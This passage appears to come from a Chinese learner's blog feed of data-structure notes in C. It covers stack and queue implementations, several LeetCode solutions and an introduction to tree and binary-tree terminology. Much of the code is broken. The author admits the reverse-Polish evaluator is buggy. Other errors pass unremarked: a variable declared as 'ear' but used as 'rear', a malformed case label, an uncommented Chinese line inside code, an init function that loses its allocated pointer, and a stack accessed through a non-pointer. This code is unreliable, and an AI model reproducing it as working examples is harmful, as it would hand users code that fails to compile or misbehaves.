<h3 id="静态栈的初始化函数"><a href="#静态栈的初始化函数" class="headerlink" title="静态栈的初始化函数"></a>静态栈的初始化函数</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="built_in">stack</span> <span class="title">Init</span><span class="params">()</span></span>&#123;             <span class="comment">//初始化栈</span></span><br><span class="line">    <span class="built_in">stack</span> s;</span><br><span class="line">    s-&gt;top = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">return</span> s;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="静态栈的进栈操作函数"><a href="#静态栈的进栈操作函数" class="headerlink" title="静态栈的进栈操作函数"></a>静态栈的进栈操作函数</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Push</span><span class="params">(<span class="built_in">stack</span> &amp;s,<span class="keyword">int</span> n)</span></span>&#123;        <span class="comment">//进栈操作，我们是对指针进行操作，因此需要添加取地址符</span></span><br><span class="line">  <span class="keyword">if</span>(s-&gt;top == P<span class="number">-1</span>)&#123;              <span class="comment">//进栈的时候必须判断是否栈满</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"stack full\n"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  s-&gt;top++;</span><br><span class="line">  s-&gt;data[s-&gt;top] = n;             <span class="comment">//将数据放入数组中</span></span><br><span class="line">	<span class="keyword">if</span>(s-&gt;top == P<span class="number">-1</span>)&#123;              <span class="comment">//进栈结束的时候判断是否栈满</span></span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>注意</strong> 由于静态表并不会自动增加存储空间，因此我们需要在进栈结束后判断栈是否已满，避免发生溢出情况。</p>
<h3 id="静态栈的出栈操作函数"><a href="#静态栈的出栈操作函数" class="headerlink" title="静态栈的出栈操作函数"></a>静态栈的出栈操作函数</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Pop</span><span class="params">(<span class="built_in">stack</span> &amp;s)</span></span>&#123;                      <span class="comment">//出栈操作</span></span><br><span class="line">  <span class="keyword">int</span> n;                                <span class="comment">//出栈元素</span></span><br><span class="line">  <span class="keyword">if</span>(s-&gt;top == <span class="number">-1</span>)&#123;                     <span class="comment">//出栈的时候必须判断是否栈空,避免数组越界</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"stack empty\n"</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">    n = s-&gt;data[s-&gt;top];</span><br><span class="line">    s-&gt;top--;</span><br><span class="line">    <span class="keyword">return</span> n;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="静态栈的取栈顶元素函数"><a href="#静态栈的取栈顶元素函数" class="headerlink" title="静态栈的取栈顶元素函数"></a>静态栈的取栈顶元素函数</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Gettop</span><span class="params">(<span class="built_in">stack</span> *s)</span></span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(s-&gt;top == <span class="number">-1</span>)&#123;                <span class="comment">//判断栈是否为空</span></span><br><span class="line">	   <span class="built_in">printf</span>(<span class="string">"Error,Stack is empty!\n"</span>);</span><br><span class="line">	   <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> s-&gt;data[s-&gt;top];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="栈的应用"><a href="#栈的应用" class="headerlink" title="栈的应用"></a>栈的应用</h2><h3 id="LeetCode-20-有效的括号"><a href="#LeetCode-20-有效的括号" class="headerlink" title="LeetCode 20 有效的括号"></a>LeetCode 20 有效的括号</h3><h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><p>遇左括号就入栈，遇右括号就把栈顶元素拿出来比对。<br>如果栈空（用 top 指针判断）,则为 True。</p>
<h4 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">isValid</span><span class="params">(<span class="keyword">char</span> * s)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>( s == <span class="literal">NULL</span> )</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">char</span> * <span class="built_in">stack</span> = (<span class="keyword">char</span> * ) <span class="built_in">malloc</span>( <span class="keyword">sizeof</span>(<span class="keyword">char</span>) * ( <span class="built_in">strlen</span>(s)+<span class="number">1</span> ) );</span><br><span class="line">    <span class="keyword">int</span> top = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>( <span class="keyword">int</span> i=<span class="number">0</span>; s[i]!=<span class="string">'\0'</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(s[i]==<span class="string">'('</span> || s[i]==<span class="string">'['</span> || s[i]==<span class="string">'&#123;'</span>) <span class="comment">//左括号入栈</span></span><br><span class="line">            <span class="built_in">stack</span>[++top] = s[i];</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>( (s[i]==<span class="string">')'</span>&amp;&amp;<span class="built_in">stack</span>[top]==<span class="string">'('</span>) || (s[i]==<span class="string">']'</span>&amp;&amp;<span class="built_in">stack</span>[top]==<span class="string">'['</span>) || (s[i]==<span class="string">'&#125;'</span>&amp;&amp;<span class="built_in">stack</span>[top]==<span class="string">'&#123;'</span>) ) <span class="comment">//右括号比对</span></span><br><span class="line">            top--;</span><br><span class="line">        <span class="keyword">else</span>    <span class="comment">//比对失败</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>( <span class="built_in">stack</span>!= <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">free</span>(<span class="built_in">stack</span>);</span><br><span class="line">        <span class="built_in">stack</span> = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>( top == <span class="number">0</span> )  <span class="comment">//字符串结束且栈空</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="LeetCode-150-逆波兰表达式求值"><a href="#LeetCode-150-逆波兰表达式求值" class="headerlink" title="LeetCode 150 逆波兰表达式求值"></a>LeetCode 150 逆波兰表达式求值</h3><h4 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h4><p>写个循环遍历字符串<br>碰到数字就压进栈<br>遇到运算符就把栈顶的两个元素弹出来<br>然后算了之后的结果再压进去<br>直到最后把栈里的最后一个元素输出即可</p>
<h4 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h4><p>这题真的很迷，每次运行都报数组越界，无奈只好放弃，就把有 bug 的源代码贴上来好了<br><img src="https://cdn.jsdelivr.net/gh/Zam-0703/Pictures/img/%E6%8A%A5%E9%94%99%E4%BF%A1%E6%81%AF.png" alt="报错信息"></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">evalRPN</span><span class="params">(<span class="keyword">char</span> ** tokens, <span class="keyword">int</span> tokensSize)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> <span class="built_in">stack</span>[<span class="number">10000</span>], top = <span class="number">0</span>;<span class="comment">//使用数组实现栈</span></span><br><span class="line">    <span class="keyword">int</span> num1, num2;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; tokensSize; i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(tokens[i] == <span class="string">'+'</span> || tokens[i] == <span class="string">'-'</span> || tokens[i] == <span class="string">'*'</span> || tokens[i] == <span class="string">'/'</span>)&#123;<span class="comment">//如果碰到运算符</span></span><br><span class="line">            num2 = <span class="built_in">stack</span>[--top]; <span class="comment">//将栈中的顶部两元素pop</span></span><br><span class="line">            num1 = <span class="built_in">stack</span>[--top];<span class="comment">//先出栈的是除数/减数，后出栈的是被除数/除数</span></span><br><span class="line">            <span class="keyword">switch</span>(tokens[i][<span class="number">0</span>])&#123;<span class="comment">//用switch_case语句确定不同运算情况</span></span><br><span class="line">                <span class="keyword">case</span> <span class="string">'-'</span> :</span><br><span class="line">                    <span class="built_in">stack</span>[top++] = num1 - num2;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">'+'</span> :</span><br><span class="line">                    <span class="built_in">stack</span>[top++] = num1 + num2;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                case '* ' :</span><br><span class="line">                    <span class="built_in">stack</span>[top++] = num1 * num2;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">'/'</span> :</span><br><span class="line">                    <span class="built_in">stack</span>[top++] = num1 / num2;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="built_in">stack</span>[top++] = atoi(tokens[i]);<span class="comment">//将字符串中的字符转化为数字push进栈</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">stack</span>[--top];<span class="comment">//将最终结果返回</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="队列"><a href="#队列" class="headerlink" title="队列"></a>队列</h1><p>队列是一种特殊的线性表，特殊之处在于它只允许在表的前端（front）进行删除操作，而在表的后端（rear）进行插入操作，和栈一样，队列是一种操作受限制的线性表。进行插入操作的端称为队尾，进行删除操作的端称为队头。</p>
<h2 id="队列的实现"><a href="#队列的实现" class="headerlink" title="队列的实现"></a>队列的实现</h2><h3 id="队列的数据结构定义"><a href="#队列的数据结构定义" class="headerlink" title="队列的数据结构定义"></a>队列的数据结构定义</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">Node</span>//数据域</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">int</span> data;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Node</span> * <span class="title">next</span>;</span></span><br><span class="line">&#125;Node,*DNode;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">Queue</span>//指针域</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    DNode front;</span><br><span class="line">    DNode rear;</span><br><span class="line">&#125;Queue,*DQueue;</span><br></pre></td></tr></table></figure>

<h3 id="队列的初始化函数"><a href="#队列的初始化函数" class="headerlink" title="队列的初始化函数"></a>队列的初始化函数</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">initQueue</span><span class="params">(DQueue Q)</span></span>&#123;</span><br><span class="line">    Q=(DQueue)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(Queue));<span class="comment">//申请队节点的内存空间</span></span><br><span class="line">    Q-&gt;front=Q-&gt;rear=<span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="队列的入队操作函数"><a href="#队列的入队操作函数" class="headerlink" title="队列的入队操作函数"></a>队列的入队操作函数</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">inQueue</span><span class="params">(DQueue Q,<span class="keyword">int</span> n)</span></span>&#123;</span><br><span class="line">    DNode q;</span><br><span class="line">    q=(DNode)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(Node));  <span class="comment">//申请队节点的内存空间</span></span><br><span class="line">    q-&gt;next=<span class="literal">NULL</span>;</span><br><span class="line">    q-&gt;data=n;将值放入节点中</span><br><span class="line">    <span class="keyword">if</span>(Q-&gt;rear==<span class="literal">NULL</span>)               <span class="comment">//判断如果队空，则插入结点为队首结点</span></span><br><span class="line">        Q-&gt;front=Q-&gt;rear=q;</span><br><span class="line">    <span class="keyword">else</span>&#123;                           <span class="comment">//若队不为空，尾指针所指的结点的next连接上q，同时后移尾指针</span></span><br><span class="line">        Q-&gt;rear-&gt;next=q;</span><br><span class="line">        Q-&gt;rear=q;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>由于队的存储空间大小是动态变化的，因此我们不需要判断队列是否已满。</p>
<h3 id="队列的出队操作函数"><a href="#队列的出队操作函数" class="headerlink" title="队列的出队操作函数"></a>队列的出队操作函数</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">outQueue</span><span class="params">(DQueue Q,<span class="keyword">int</span> x)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(Q-&gt;front==<span class="literal">NULL</span> || Q-&gt;rear==<span class="literal">NULL</span>)     <span class="comment">//判断队列是否为空</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    DNode q;</span><br><span class="line">    <span class="comment">//出队结点是front指向的结点,用一个结点q存储和释放出队结点</span></span><br><span class="line">    q=Q-&gt;front;</span><br><span class="line">    <span class="comment">//判断是否仅有一个结点</span></span><br><span class="line">    <span class="keyword">if</span>(Q-&gt;front==Q-&gt;rear)</span><br><span class="line">        Q-&gt;front=Q-&gt;rear=<span class="literal">NULL</span>;<span class="comment">//仅有一节点则该元素出队后队列即空</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        Q-&gt;front=Q-&gt;front-&gt;next;<span class="comment">//将front指针指向下一个节点</span></span><br><span class="line">    x=q-&gt;data;</span><br><span class="line">    <span class="built_in">free</span>(q);                                <span class="comment">//释放节点内存空间</span></span><br><span class="line">    <span class="keyword">return</span> x;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="队列的取队尾元素函数"><a href="#队列的取队尾元素函数" class="headerlink" title="队列的取队尾元素函数"></a>队列的取队尾元素函数</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">getFront</span><span class="params">(DQueue Q)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(Q-&gt;front==<span class="literal">NULL</span> || Q-&gt;rear==<span class="literal">NULL</span>)     <span class="comment">//判断队列是否为空</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">return</span> Q-&gt;front-&gt;data;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="队列的应用"><a href="#队列的应用" class="headerlink" title="队列的应用"></a>队列的应用</h2><h3 id="LeetCode-21-合并两个有序链表"><a href="#LeetCode-21-合并两个有序链表" class="headerlink" title="LeetCode 21 合并两个有序链表"></a>LeetCode 21 合并两个有序链表</h3><h4 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h4><p>定义一个新链表。<br>比较两个原链表中元素的大小，并把它放到新链表中。<br>然后再把放入了新元素的链表的指针向后移一个节点，没有放入新元素的链表的指针不动。<br>如果一个链表指针已经指向队尾，那么就把另外一个链表之后的所有节点原封不动全部放入新链表中。</p>
<h4 id="代码-2"><a href="#代码-2" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * struct ListNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     struct ListNode *next;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">struct ListNode* <span class="title">mergeTwoLists</span><span class="params">(struct ListNode* l1, struct ListNode* l2)</span></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span> <span class="title">output</span>;</span></span><br><span class="line">    output.next = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span> * <span class="title">ear</span> = &amp;<span class="title">output</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span> * <span class="title">node</span> = <span class="title">NULL</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(l1 &amp;&amp; l2)&#123;</span><br><span class="line">        rear-&gt;next = l1-&gt;val &lt; l2-&gt;val ? l1 : l2;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(l1-&gt;val &lt; l2-&gt;val)&#123;</span><br><span class="line">            l1 = l1-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            l2 = l2-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        rear = rear-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(l1)&#123;</span><br><span class="line">        rear-&gt;next = l1;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(l2)&#123;</span><br><span class="line">        rear-&gt;next = l2;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> output.next;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="LeetCode-2-两数相加"><a href="#LeetCode-2-两数相加" class="headerlink" title="LeetCode 2 两数相加"></a>LeetCode 2 两数相加</h3><h4 id="思路-3"><a href="#思路-3" class="headerlink" title="思路"></a>思路</h4><p><del>懒得写了</del>全部写在代码的注释当中……</p>
<h4 id="代码-3"><a href="#代码-3" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * struct ListNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     struct ListNode *next;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> value = <span class="number">0</span>;<span class="comment">//使用全局变量，来实现进位</span></span><br><span class="line"></span><br><span class="line"><span class="function">struct ListNode* <span class="title">addTwoNumbers</span><span class="params">(struct ListNode* l1, struct ListNode* l2)</span></span>&#123;<span class="comment">//使用递归将链表各个对应的元素相加</span></span><br><span class="line">    <span class="keyword">if</span>(l1==<span class="literal">NULL</span>&amp;&amp;l2==<span class="literal">NULL</span>&amp;&amp;value==<span class="number">0</span>)&#123;<span class="comment">//判断输入的链表节点是否已经超过的链表的末尾，是否还有没存入最终输出链表的元素</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(l1!=<span class="literal">NULL</span>)&#123;</span><br><span class="line">        value+=l1-&gt;val;<span class="comment">//如果当前链表节点存在，则把它的值取出来加到value上</span></span><br><span class="line">        l1=l1-&gt;next;<span class="comment">//使得指针指向下一个节点</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        value+=<span class="number">0</span>;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">if</span>(l2!=<span class="literal">NULL</span>)&#123;</span><br><span class="line">        value+=l2-&gt;val;</span><br><span class="line">        l2=l2-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        value+=<span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span> *<span class="title">outList</span>=(<span class="title">struct</span> <span class="title">ListNode</span> *)<span class="title">malloc</span>(<span class="title">sizeof</span>(<span class="title">struct</span> <span class="title">ListNode</span>));</span><span class="comment">//开辟数组空间储存当前的链表节点</span></span><br><span class="line">    outList-&gt;val=value%<span class="number">10</span>;<span class="comment">//使用取模计算符保证val的值是value的个位数部分</span></span><br><span class="line">    value=value/<span class="number">10</span>;<span class="comment">//使用整除来保存value中需要进位的十位数的值</span></span><br><span class="line">    outList-&gt;next=addTwoNumbers(l1,l2);</span><br><span class="line">    <span class="keyword">return</span> outList;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="还有两道困难题……"><a href="#还有两道困难题……" class="headerlink" title="还有两道困难题……"></a>还有两道困难题……</h1><p>就先咕为敬了，告辞<br>有空再补<br><img src="https://cdn.jsdelivr.net/gh/Zam-0703/Pictures/img/1571031606850.gif" alt="咕咕咕"></p>
]]></content>
      <tags>
        <tag>C</tag>
        <tag>Stack</tag>
        <tag>Learning</tag>
        <tag>Queue</tag>
        <tag>Data Structure</tag>
      </tags>
  </entry>
  <entry>
    <title>AST-Task4</title>
    <url>/2019/11/26/AST-Task4/</url>
    <content><![CDATA[<p>咕咕咕了这么久，终于有空好好学学树与二叉树的数据结构了。</p>
<p>Update 2020.04.16 :过去了半年，依旧还没有完成…… <em>咕咕咕，咕咕咕，咕叽咕叽咕</em></p>
<a id="more"></a>


<h1 id="树的基本概念"><a href="#树的基本概念" class="headerlink" title="树的基本概念"></a>树的基本概念</h1><p>下面是一些关于树的基本术语：</p>
<table>
<thead>
<tr>
<th>术语</th>
<th>中文</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>Root</td>
<td>根节点</td>
<td>The top node in a tree.</td>
</tr>
<tr>
<td>Child</td>
<td>子节点</td>
<td>A node directly connected to another node when moving away from the Root.</td>
</tr>
<tr>
<td>Leaf</td>
<td>叶子节点</td>
<td>A node with no children</td>
</tr>
<tr>
<td>Edge</td>
<td>边</td>
<td>The connection between one node and another.</td>
</tr>
<tr>
<td>Path</td>
<td>路径</td>
<td>A sequence of nodes and edges connecting a node with a descendant.</td>
</tr>
<tr>
<td>Height</td>
<td>节点高度</td>
<td>The height of a node is the number of edges on the longest path between that node and a leaf.</td>
</tr>
<tr>
<td>Level</td>
<td>层级</td>
<td>The level of a node is defined by 1 + (the number of connections between the node and the root).</td>
</tr>
<tr>
<td>Depth</td>
<td>深度</td>
<td>The depth of a node is the number of edges from the tree’s root node to the node.</td>
</tr>
<tr>
<td>Degree</td>
<td>度</td>
<td>The number of subtrees of a node.</td>
</tr>
</tbody></table>
<p>下面通过几个图解释树的术语</p>
<p><img src="https://img-blog.csdn.net/2018060421094461?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2pvaG5ueTkwMTExNA==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="Edge、Root、Leaf"><br><img src="https://img-blog.csdn.net/20180604212429282?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2pvaG5ueTkwMTExNA==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="Path"><br><img src="https://img-blog.csdn.net/20180604213303945?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2pvaG5ueTkwMTExNA==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="Height"></p>
<p>需要注意的是叶子节点的高度为 0，如果树只有一个节点，那么这个节点的高也是 0</p>
<p><img src="https://img-blog.csdn.net/20180604215258931?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2pvaG5ueTkwMTExNA==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="Depth"></p>
<p>需要注意的是根节点的深度（Depth）是 0.</p>
<p>从 Height 和 Depth 的对比，它们的方向刚好是相反的。<br>对于 Height 和 Depth 不用死记，我们可以把树倒过来看，也就是我们现实生活当中的树，求某个节点的 Height 那肯定是从根部往上的方向；如果是求某个节点的深度，方向肯定是向下的。</p>
<p><img src="https://img-blog.csdn.net/20180604220744284?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2pvaG5ueTkwMTExNA==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="Level"></p>
<p>节点的 Level 是从 1 开始的，Level = Depth+1，根节点的 Level=1<br>也有很多书籍上 Level 是从 0 开始的，这样的话 Level 就等于 Depth，根节点的 Level=0</p>
<p>reference:<a href="https://blog.csdn.net/johnny901114/article/details/80574803" target="_blank" rel="noopener">数据结构与算法（七）树和二叉树</a></p>
<h1 id="二叉树的基本概念"><a href="#二叉树的基本概念" class="headerlink" title="二叉树的基本概念"></a>二叉树的基本概念</h1><p>二叉树是一个每个最结最多只能有两个分支的树，左边的分支称之为左子树，右边的分支称之为右子树。</p>
<p>也就是说二叉树节点的度最大也就是 2，而普通的树，节点的度是没有限制的。</p>
<h2 id="二叉树的分类"><a href="#二叉树的分类" class="headerlink" title="二叉树的分类"></a>二叉树的分类</h2><h3 id="完美-满二叉树"><a href="#完美-满二叉树" class="headerlink" title="完美/满二叉树"></a>完美/满二叉树</h3><p>完美二叉树也有地方称之为满二叉树。完美二叉树满足两个特性：</p>
<ul>
<li>所有的几点都包含两个子节点</li>
<li>所有的叶子节点的 Height 或者 Level 都相等</li>
</ul>
<p>例如下面就是一个完美二叉树：<br><img src="https://img-blog.csdn.net/2018060422441774?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2pvaG5ueTkwMTExNA==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="完美二叉树"></p>
<h3 id="完全二叉树"><a href="#完全二叉树" class="headerlink" title="完全二叉树"></a>完全二叉树</h3><p>完全二叉树是 除了最后一层都是满的（都有两个子节点），并且最后一层的节点是从左往右排列的。</p>
<p>完全二叉树，通俗点说就是节点按层从左往右排列。如果最后一层排满了就是完美二叉树，没有满则是完全二叉树。<br>所以完美二叉树一定是完全二叉树，完全二叉树不一定是完美二叉树。</p>
<p>一个完全二叉树可以高效的使用数组来表示。</p>
<p>例如下面就是一个完全二叉树：<br><img src="https://img-blog.csdn.net/20180604225850509?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2pvaG5ueTkwMTExNA==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="完全二叉树"></p>
<h3 id="完满二叉树"><a href="#完满二叉树" class="headerlink" title="完满二叉树"></a>完满二叉树</h3><p>完满二叉树就简单了，就是每个节点都有两个子节点。也就是说它比完美二叉树少了一个条件。</p>
<p>例如下面就是一个完满二叉树：<br><img src="https://img-blog.csdn.net/20180604230227328?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2pvaG5ueTkwMTExNA==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="完满二叉树"></p>
<h1 id="学习并实现树的相关操作"><a href="#学习并实现树的相关操作" class="headerlink" title="学习并实现树的相关操作"></a>学习并实现树的相关操作</h1><p>在这里，我们定义一个如下的二叉树数据结构：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">char</span> BTDataType;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">BTNode</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">BTNode</span> * _<span class="title">pLeft</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">BTNode</span> * _<span class="title">pRight</span>;</span></span><br><span class="line">	BTDataType _data;</span><br><span class="line">&#125;BTNode;</span><br></pre></td></tr></table></figure>

<h2 id="遍历二叉树"><a href="#遍历二叉树" class="headerlink" title="遍历二叉树"></a>遍历二叉树</h2><p>从二叉树的递归定义可知，一棵非空的二叉树由根结点及左、右子树这三个基本部分组成。因此，在任一给定结点上，可以按某种次序执行三个操作：</p>
<p>⑴ 访问结点本身（N）</p>
<p>⑵ 遍历该结点的左子树（L）</p>
<p>⑶ 遍历该结点的右子树（R）</p>
<p>以上三种操作有六种执行次序：</p>
<p><code>NLR、LNR、LRN、NRL、RNL、RLN。</code></p>
<p>注意：</p>
<p>前三种次序与后三种次序对称，故只讨论先左后右的前三种次序。</p>
<p>因此，我们就可以根据访问结点操作发生位置命名：</p>
<ul>
<li>NLR：前序遍历(Preorder Traversal 亦称（先序遍历）） ——访问根结点的操作发生在遍历其左右子树之前。</li>
<li>LNR：中序遍历(Inorder Traversal) ——访问根结点的操作发生在遍历其左右子树之中（间）。</li>
<li>LRN：后序遍历(Postorder Traversal) ——访问根结点的操作发生在遍历其左右子树之后。<br>注意：</li>
</ul>
<p>由于被访问的结点必是某子树的根，所以 N(Node）、L(Left subtree）和 R(Right subtree）又可解释为根、根的左子树和根的右子树。NLR、LNR 和 LRN 分别又称为先根遍历、中根遍历和后根遍历。</p>
